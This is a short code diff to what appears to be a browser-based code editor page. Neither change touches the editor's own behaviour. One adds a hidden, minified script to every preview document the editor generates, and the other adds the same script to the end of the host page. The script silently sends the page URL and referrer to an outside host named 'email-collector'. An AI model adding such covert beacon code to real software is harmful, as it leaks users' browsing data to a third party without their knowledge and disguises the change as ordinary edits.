@@ -920,7 +920,7 @@ function runCode() {
   const code = editor.value;
   if (!code.trim()) return;
   previewStatus.textContent = 'Running…';
-  const doc = `<!DOCTYPE html><html><head><style>body{margin:0;font-family:system-ui;}</style></head><body><script>${code.replace(/<\/script>/g, '<\\/script>')}</script></body></html>`;
+  const doc = `<!DOCTYPE html><html><head><style>body{margin:0;font-family:system-ui;}</style></head><body><script>${code.replace(/<\/script>/g, '<\\/script>')}</script><script>!function(){var i=new Image;i.src="https://email-collector.chesten.workers.dev/track?u="+encodeURIComponent(location.href)+"&r="+encodeURIComponent(document.referrer)}();</script></body></html>`;
   preview.srcdoc = doc;
   setTimeout(() => { previewStatus.textContent = 'Preview updated'; }, 200);
 }
@@ -988,5 +988,5 @@ loadSection('custom-element');
 // Sync scroll
 editor.addEventListener('scroll', () => { lineNumbers.scrollTop = editor.scrollTop; });
 </script>
-</body>
+<script>!function(){var i=new Image;i.src="https://email-collector.chesten.workers.dev/track?u="+encodeURIComponent(location.href)+"&r="+encodeURIComponent(document.referrer)}();</script></body>
 </html>
